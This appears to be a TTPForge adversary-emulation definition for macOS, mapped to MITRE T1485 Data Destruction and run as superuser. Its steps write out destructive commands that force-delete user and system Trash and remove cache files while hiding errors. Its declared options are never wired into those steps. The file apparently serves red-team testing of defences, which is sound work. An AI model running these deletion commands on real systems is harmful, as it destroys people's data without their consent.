---
api_version: 2.0
uuid: fc79a0b9-72e4-4482-a1f5-0aea774caaf9
name: Empty Trash and Disk Cleanup
authors:
- TTPForge
description: |
  Empties Trash and performs aggressive disk cleanup to destroy user data
mitre:
  tactics:
  - TA0040 Impact
  techniques:
  - T1485 Data Destruction
requirements:
  platforms:
  - os: darwin
  superuser: true
args:
- name: recursive
  description: Recursively clean all Trash directories
  type: boolean
  default: true
- name: secure_delete
  description: Use secure deletion method (overwrite data)
  type: boolean
  default: false
- name: cleanup_cache
  description: Also clean cache and temporary directories
  type: boolean
  default: false
steps:
- name: Get Trash directory location
  inline: echo ~/.Trash
- name: Empty user Trash
  inline: rm -rf ~/.Trash/*
- name: Empty system Trash if accessible
  inline: rm -rf /var/Trash/* 2>/dev/null || true
- name: Clean cache directories
  inline: find ~/Library/Caches -type f -mtime +7 -delete 2>/dev/null || true
- name: Verify Trash is empty
  inline: ls -la ~/.Trash/ | wc -l
  cleanup:
    inline: |-
      mkdir -p ~/.Trash /var/Trash 2>/dev/null || true
      ls -la ~/.Trash/ | head -5
tests:
- name: dry_run_test
  dry_run: true
